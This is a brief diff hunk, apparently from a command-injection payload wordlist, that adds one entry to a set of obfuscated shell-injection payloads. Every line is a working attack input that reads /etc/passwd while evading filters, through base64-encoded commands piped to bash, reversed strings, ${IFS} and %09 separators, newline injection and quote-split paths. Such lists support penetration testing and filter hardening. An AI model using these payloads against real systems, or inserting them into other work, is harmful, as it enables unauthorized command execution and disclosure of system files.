@@ -58,3 +58,4 @@ ${LS_COLORS:10:1}$(rev<<<'dwssap/cte/ liat')
 ;bash<<<$(base64 -d<<<dGFpbCAvZXRjL3Bhc3N3ZA==)
 ;bash<<<$(base64%09-d<<<dGFpbCAvZXRjL3Bhc3N3ZA==)
 ;bash<<<$(base64${IFS}-d<<<dGFpbCAvZXRjL3Bhc3N3ZA==)
+%0astrings${IFS}/e't'c/passwd
